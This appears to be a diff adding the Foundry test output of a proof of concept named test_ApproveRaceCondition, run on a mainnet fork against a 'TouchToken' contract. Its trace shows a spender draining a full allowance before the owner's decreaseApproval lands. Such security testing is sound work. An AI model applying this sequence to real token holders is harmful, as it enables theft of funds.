@@ -1,0 +1,41 @@
+No files changed, compilation skipped
+2026-06-16T09:24:05.900255Z  WARN foundry_fork_db::cache: Failed to read cache file err=Os { code: 2, kind: NotFound, message: "No such file or directory" } path="/Users/carl/.foundry/cache/rpc/mainnet/25329163"
+
+Ran 1 test for test/Exploit.t.sol:ExploitTest
+[PASS] test_ApproveRaceCondition() (gas: 62351)
+2026-06-16T09:24:11.581188Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T09:24:11.582766Z  WARN traces::etherscan: could not get etherscan info: ErrorResponse { status: "0", message: "NOTOK", result: Some("Max calls per sec rate limit reached (3/sec)") }
+2026-06-16T09:24:11.582879Z  WARN traces::etherscan: could not get etherscan info: ErrorResponse { status: "0", message: "NOTOK", result: Some("Max calls per sec rate limit reached (3/sec)") }
+2026-06-16T09:24:11.583202Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T09:24:11.789049Z  WARN traces::etherscan: could not get etherscan info: ErrorResponse { status: "0", message: "NOTOK", result: Some("Max calls per sec rate limit reached (3/sec)") }
+2026-06-16T09:24:11.789523Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T09:24:11.789621Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T09:24:11.789681Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+Traces:
+  [82251] ExploitTest::test_ApproveRaceCondition()
+    ├─ [0] VM::prank(Alice: [0x0000000000000000000000000000000000001111])
+    │   └─ ← [Return]
+    ├─ [26945] TouchToken::approve(Bob: [0x0000000000000000000000000000000000002222], 100000000000000000000 [1e20])
+    │   ├─ emit Approval(owner: Alice: [0x0000000000000000000000000000000000001111], spender: Bob: [0x0000000000000000000000000000000000002222], value: 100000000000000000000 [1e20])
+    │   └─ ← [Return] true
+    ├─ [958] TouchToken::allowance(Alice: [0x0000000000000000000000000000000000001111], Bob: [0x0000000000000000000000000000000000002222]) [staticcall]
+    │   └─ ← [Return] 100000000000000000000 [1e20]
+    ├─ [0] VM::prank(Bob: [0x0000000000000000000000000000000000002222])
+    │   └─ ← [Return]
+    ├─ [31558] TouchToken::transferFrom(Alice: [0x0000000000000000000000000000000000001111], Bob: [0x0000000000000000000000000000000000002222], 100000000000000000000 [1e20])
+    │   ├─ emit Transfer(from: Alice: [0x0000000000000000000000000000000000001111], to: Bob: [0x0000000000000000000000000000000000002222], value: 100000000000000000000 [1e20])
+    │   └─ ← [Return] true
+    ├─ [679] TouchToken::balanceOf(Bob: [0x0000000000000000000000000000000000002222]) [staticcall]
+    │   └─ ← [Return] 100000000000000000000 [1e20]
+    ├─ [679] TouchToken::balanceOf(Alice: [0x0000000000000000000000000000000000001111]) [staticcall]
+    │   └─ ← [Return] 900000000000000000000 [9e20]
+    ├─ [0] VM::prank(Alice: [0x0000000000000000000000000000000000001111])
+    │   └─ ← [Return]
+    ├─ [3533] TouchToken::decreaseApproval(Bob: [0x0000000000000000000000000000000000002222], 100000000000000000000 [1e20])
+    │   ├─ emit Approval(owner: Alice: [0x0000000000000000000000000000000000001111], spender: Bob: [0x0000000000000000000000000000000000002222], value: 0)
+    │   └─ ← [Return] true
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.94s (1.06s CPU time)
+
+Ran 1 test suite in 6.98s (4.94s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
